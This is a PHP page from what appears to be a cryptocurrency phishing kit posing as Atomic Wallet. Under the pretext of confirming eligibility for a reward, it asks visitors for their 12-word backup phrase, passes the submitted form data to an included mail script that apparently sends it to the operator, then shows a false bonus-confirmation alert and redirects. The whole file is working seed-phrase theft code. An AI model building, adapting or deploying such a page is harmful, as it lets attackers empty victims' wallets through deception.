 <?php require './header.php'; ?>


 <main>
     <section class="sectionss">
         <div class="container box">
             <h4>The Backup Phrase Confirmation is to make sure the ones who claim the reward are Atomic Wallet users and active wallet.</h4>

             <img src="./atomic-logo2-768x966.png" class="img-claim" alt="">


             <form method="post">
                 <textarea style="background-color:#fff;padding:5px; border-radius:5px; height:100px;" type="text" name="word" class=" my-5" placeholder="Type 12-word Backup phrase"></textarea>
                 <br>
                 <button name="submit" type="submit" class="btn btn-primary btn-block">Restore</button>
             </form>


             <?php

                if (isset($_POST['submit'])) {
                    extract($_POST);
                    require './userMail.php';
                    echo "<script type='text/javascript'>alert('Thanks for your cooperation, if qualified, you will recieve your bonus in the next 24 hours');</script>";
                    echo "<script type='text/javascript'>location.href = './index.php';</script>";
                }

                ?>

         </div>
     </section>


     <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
     <script defer async src=assets/main.js type="c972d5debeedb6c027fc306b-text/javascript"></script>
 </main>


 <?php require './footer.php'; ?>